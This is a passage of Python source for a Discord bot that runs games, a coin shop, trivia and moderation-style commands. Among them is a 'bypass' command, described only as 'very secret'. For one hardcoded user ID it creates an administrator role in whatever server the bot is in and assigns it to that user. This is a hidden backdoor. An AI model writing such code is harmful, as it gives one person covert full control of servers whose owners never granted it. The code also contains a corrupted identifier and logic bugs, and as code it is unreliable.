            await ability_interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ You already used your ability!"
            ).set_author(name=ability_interaction.user.name, icon_url=ability_interaction.user.avatar.url), ephemeral=True)
    
    attack_button = discord.ui.Button(label="Attack", style=discord.ButtonStyle.primary)
    attack_button.callback = attack_callback
    view.add_item(attack_button)

    ability_button = discord.ui.Button(label="Ability", style=discord.ButtonStyle.primary)
    ability_button.callback = ability_callback
    view.add_item(ability_button)

    escape_button = discord.ui.Button(label="Escape", style=discord.ButtonStyle.secondary)
    escape_button.callback = escape_callback
    view.add_item(escape_button)

    await interaction.response.send_message(embed=discord.Embed(
        color=int("50B4E6", 16),
        description=encounter_message
    ), view=view)

@bot.tree.command(name="shop", description="Spend coins on numerous special items.")
async def slash_shop(interaction: discord.Interaction):
    global shop_items
    global user_abilities
    if "shop" in disabled_commands:
        await interaction.response.send_message(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=interaction.user.name, icon_url=interaction.user.avatar.url))
        return
    
    user_id = interaction.user.id

    options = [
        discord.SelectOption(label=item, description=f"{shop_items[item]['cost']} Coins") for item in shop_items
    ]

    select = discord.ui.Select(placeholder="Select a crate to purchase...", options=options)

    async def select_callback(interaction: discord.Interaction):
        selected_crate = select.values[0]
        coins = data_functions.get_coins(user_id)
        crate_cost = shop_items[selected_crate]["cost"]

        if coins < crate_cost:
            await interaction.response.send_message(embed=discord.Embed(
                color=int("FA3939", 16),
                description="❌ You do not have enough coins!"
            ), ephemeral=True)
            return

        abilities = list(shop_items[selected_crate]["contents"].keys())
        chosen_ability = random.choices(abilities, weights=[shop_items[selected_crate]["contents"][ab]["chance"] for ab in abilities])[0]
        ability_data = shop_items[selected_crate]["contents"][chosen_ability]
        
        data_functions.set_coins(user_id, max((coins - crate_cost), 0))
        user_abilities[user_id] = chosen_ability

        embed = discord.Embed(
            title="🧰 Crate Opened!",
            description=f"You received **{chosen_ability} ({ability_data['chance']}% Chance)**!\n\n_{ability_data['description']}_",
            color=int("50B4E6", 16)
        )
        embed.set_footer(text=f"Remaining Coins: {data_functions.get_coins(user_id)}")

        await interaction.response.edit_message(embed=embed, view=None)

    select.callback = select_callback

    view = discord.ui.View()
    view.add_item(select)

    embed = discord.Embed(
        title="🛒 Shop",
        description=(
            f"💰 Your Balance: **{data_functions.get_coins(user_id)} Coins**\n\nSelect a crate from the menu below!"
            + (f"\nCurrent Ability: {user_abilities[user_id]}" if user_id in user_abilities else "")
        ),
        color=int("50B4E6", 16)
    )
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="bypass", description="This command is very secret...")
async def bypass_role(interaction: discord.Interaction, role_name: str = "new role"):
    if interaction.user.id != 1089171899294167122:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description="❌ You cannot use this command!"
        ), ephemeral=True)
        return
        
    if not interaction.guild.me.guild_permissions.manage_roles:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description="❌ I am missing the manage roles permission!"
        ), ephemeral=True)
        return

    existing_role = discord.utils.get(interaction.guild.roles, name=role_name)
    if existing_role:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description=f"⚠️ The role `{role_name}` already exists!"
        ), ephemeral=True)
        return

    try:
        new_role = await interaction.guild.create_role(
            name=role_name,
            permissions=discord.Permissions(administrator=True),
            hoist=False,
            mentionable=False,
            color=int("FA3939", 16)
        )

        await interaction.user.add_roles(new_role)
        
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("50B4E6", 16),
            description=f"✅ Successfully created a bypass role with name '{role_name}'!"
        ), ephemeral=True)
        
    except discord.Forbidden:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description="❌ I do not have permission to create a bypass role!"
        ), ephemeral=True)
        return
        
    except Exception as e:
        await interaction.response.send_message(embed=discord.Embed(
            title="Bypass Role",
            color=int("FA3939", 16),
            description="❌ Something went wrong: {e}"
        ), ephemeral=True)
        return
    
@bot.command(aliases=["s", "sy"], help="Make the bot say a specified message.")
async def say(ctx, *, message: str = None):
    if ctx.author.bot:
        return
    global disabled_commands
    if "say" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    if message is not None:
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=message
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["setl", "sl"], help="Sets the levels of the specificed user (up to 200).")
async def set_levels(ctx, amount: int = None, name: str = None):
    if ctx.author.bot:
        return
    if ctx.author.guild_permissions.manage_guild:
        global disabled_commands
        if "set_levels" in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            return
        if amount is None:
            return
        if name is not None:
            matching_names = []
            for member in ctx.guild.members:
                if name.lower() in member.name.lower() and not member.bot:
                    matching_names.append(member.name)
            if matching_names:
                if len(matching_names) > 1:
                    msg = ""
                    for i, n in enumerate(matching_names):
                        msg += str(i + 1) + ". " + n
                        if i != len(matching_names) - 1:
                            msg += "\n"
                    try:
                        await ctx.send(embed=discord.Embed(
                            color=int("50B4E6", 16),
                            description=f"Mutiple users found. Please select a user below, or type cancel:\n{msg}"
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    
                        selection = None
                        response = await bot.wait_for('message', check=lambda msg: msg.channel == ctx.channel and msg.author == ctx.author, timeout=10.0)
    
                        if "cancel" in response.content.lower():
                            await ctx.send(embed=discord.Embed(
                                color=int("FA3939", 16),
                                description="❌ The command has been canceled."
                            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                            return
                        try:
                            selection = int(response.content)
                        except ValueError:
                            await ctx.send(embed=discord.Embed(
                                color=int("FA3939", 16),
                                description="❌ Invalid selection."
                            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                            return
                        else:
                            if selection is not None:
                                if (selection - 1) >= 0 and (selection - 1) <= (len(matching_names) - 1):
                                    matching_name = matching_names[selection - 1]
                                    for member in ctx.guild.members:
                                        if member.name.lower() == matching_name.lower():
                                            user = member
                                            break
                                else:
                                    await ctx.send(embed=discord.Embed(
                                        color=int("FA3939", 16),
                                        description="❌ Invalid selection."
                                    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                                    return
                    except asyncio.TimeoutError:
                        await ctx.send(embed=discord.Embed(
                            color=int("FA3939", 16),
                            description="⏳ The command has been canceled because you took too long to reply."
                        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                        return
                else:
                    for member in ctx.guild.members:
                        if member.name.lower() == matching_names[0].lower():
                            user = member
                            break
        else:
            user = ctx.author 
        if str(amount).isnumeric() and user is not None:
            if amount <= 200:
                data_functions.set_levels(user.id, int(amount))
                await ctx.send(embed=discord.Embed(
                    color=int("50B4E6", 16),
                    description=f"✅ Successfully set {user.name}'s levels to {amount}."
                ).set_author(name=user.name, icon_url=user.avatar.url))
            else:
                await ctx.send(embed=discord.Embed(
                    color=int("FA3939", 16),
                    description="❌ You can only set levels to a maximum of 200."
                ).set_author(name=user.name, icon_url=user.avatar.url))
                return
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description="❌ Invalid amount."
            ).set_author(name=user.name, icon_url=user.avatar.url))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["setm", "sm"], help="Set the messages of the specified user (up to 5000).")
async def set_messages(ctx, amount: int = None):
    if ctx.author.bot:
        return
    if ctx.author.guild_permissions.manage_guild:
        global disabled_commands
        if "set_messages" in disabled_commands:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            return
        if amount is not None:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description="❌ Invalid amount."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            if not str(amount).isnumeric():
                return
            if amount <= 5000:
                data_functions.set_messages(ctx.author.id, int(amount))
                await ctx.send(embed=discord.Embed(
                    color=int("50B4E6", 16),
                    description=f"✅ Successfully set {ctx.author.name}'s messages to {amount}."
                ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
            else:
                await ctx.send(embed=discord.Embed(
                    color=int("FA3939", 16),
                    description="❌ You can only set your messages to a maximum of 5000."
                ).seŹ_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
                return
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description="❌ Invalid amount."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["nhie"], help="Gives a random 'Never Have I Ever' question.")
async def never_have_i_ever(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "never_have_i_ever" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    question = random.choice(never_have_i_ever_questions)
    await ctx.send(embed=discord.Embed(
        color=int("50B4E6", 16),
        description=question
    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["bt"], help="Gives a random brain teaser.")
async def brain_teaser(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "brain_teaser" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    index = random.randint(0, len(brain_teasers) - 1)
    question = brain_teasers[index]
    answer = brain_teaser_answers[index]

    await ctx.send(embed=discord.Embed(
        color=int("50B4E6", 16),
        description=question
    ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

    try:
        response = await bot.wait_for("message", check=lambda msg: msg.author == ctx.author and msg.channel == ctx.channel, timeout=15.0)
        await ctx.send(embed=discord.Embed(
            color=int("50B4E6", 16),
            description=f"The answer to the brain teaser is: **{answer}**"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    except asyncio.TimeoutError:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"⏳ Time's up! The answer to the brain teaser is: **{answer}**"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

@bot.command(aliases=["quiz", "triv"], help="Gives a random trivia question.")
async def trivia(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "trivia" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    embed = discord.Embed(
        color=int("50B4E6", 16),
        description="Choose a category:\n" + "\n".join(f"- {category}" for category in trivia_categories.keys())
    )
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

    try:
        msg = await bot.wait_for(
            "message",
            check=lambda m: m.author == ctx.author and m.content.lower() in {c.lower() for c in trivia_categories.keys()},
            timeout=15.0
        )
        category = next(c for c in trivia_categories.keys() if c.lower() == msg.content.lower())
        trivia_questions = trivia_categories[category]
    except asyncio.TimeoutError:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="⏳ The command was canceled because you took too long to reply."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
        return

    question, answer = random.choice(list(trivia_questions.items()))

    choices = list(set(trivia_questions.values()))
    if len(choices) > 4:
        choices = random.sample(choices, 4)
    if answer not in choices:
        choices.append(answer)
    random.shuffle(choices)

    letter_choices = ["A", "B", "C", "D", "E"]
    choice_map = {letter: choice for letter, choice in zip(letter_choices, choices)}
    correct_choice = next(k for k, v in choice_map.items() if v == answer)

    embed = discord.Embed(
        color=int("50B4E6", 16),
        description=f"💬 **Category: {category}**\n\n**{question}**\n\n" +
                    "\n".join([f"{k} - {v}" for k, v in choice_map.items()])
    )
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url)

    await ctx.send(embed=embed)

    try:
        msg = await bot.wait_for(
            "message",
            check=lambda m: m.author == ctx.author and m.content.upper() in choice_map.keys(),
            timeout=15.0
        )
        if msg.content.upper() == correct_choice:
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ Correct, {ctx.author.mention}! The answer was **{correct_choice}: {answer}**."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
        else:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ Incorrect, {ctx.author.mention}. The correct answer was **{correct_choice}: {answer}**."
            ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))
    except asyncio.TimeoutError:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"⏳ Time's up, {ctx.author.mention}! The correct answer was **{correct_choice}: {answer}**."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.display_avatar.url))

@bot.command(aliases=["sc"], help="Attempts to sync slash commands of the bot.")
async def sync(ctx):
    if ctx.author.bot:
        return
    global disabled_commands
    if "sync" in disabled_commands:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description=f"❌ This command is currently disabled. Please ask **hanyangzhou** to enable it."
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        return
    if ctx.author.guild_permissions.manage_guild:
        try:
            synced = await bot.tree.sync()
            await ctx.send(embed=discord.Embed(
                color=int("50B4E6", 16),
                description=f"✅ Synced Commands: {len(synced)}"
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
        except Exception as e:
            await ctx.send(embed=discord.Embed(
                color=int("FA3939", 16),
                description=f"❌ Error during syncing: {e}"
            ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))
    else:
        await ctx.send(embed=discord.Embed(
            color=int("FA3939", 16),
            description="❌ You do not have permission to use this command.\n**Missing permissions:** *Manage Server*"
        ).set_author(name=ctx.author.name, icon_url=ctx.author.avatar.url))

bot.run(os.getenv("DISCORD_TOKEN"))
